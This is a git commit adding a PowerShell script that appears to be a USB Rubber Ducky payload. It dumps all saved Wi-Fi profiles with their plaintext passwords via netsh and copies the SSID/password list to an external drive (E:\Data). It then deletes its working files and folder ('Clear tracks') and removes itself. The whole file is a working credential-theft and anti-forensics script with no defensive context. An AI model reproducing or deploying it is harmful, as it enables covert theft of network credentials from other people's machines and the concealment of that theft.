a3469f55bc358ae13594c876d7984b2cb5455560
OscarZoomer <oszoomer@gmail.com>
2021-08-30 12:11:03 +0200

    Create wifipass.ps1

---
+++ wifipass.ps1
@@ -0,0 +1,28 @@
+# All the files will be saved in this directory
+$p = "C:\wipass"
+mkdir $p
+cd $p
+
+$PC_NAME = "$env:computername wifipass"
+
+# Get all saved wifi password
+netsh wlan export profile key=clear
+dir *.xml |% {
+$xml=[xml] (get-content $_)
+$a= "========================================`r`n SSID = "+$xml.WLANProfile.SSIDConfig.SSID.name + "`r`n PASS = " +$xml.WLANProfile.MSM.Security.sharedKey.keymaterial
+Out-File "$PC_NAME.txt" -Append -InputObject $a
+}
+
+
+copy-item "C:\wipass\$PC_NAME.txt" E:\Data
+
+
+# Clear tracks
+rm *.xml
+rm *.txt
+cd ..
+rm wipass
+
+
+# remove ducky payload
+rm wifipass.ps1
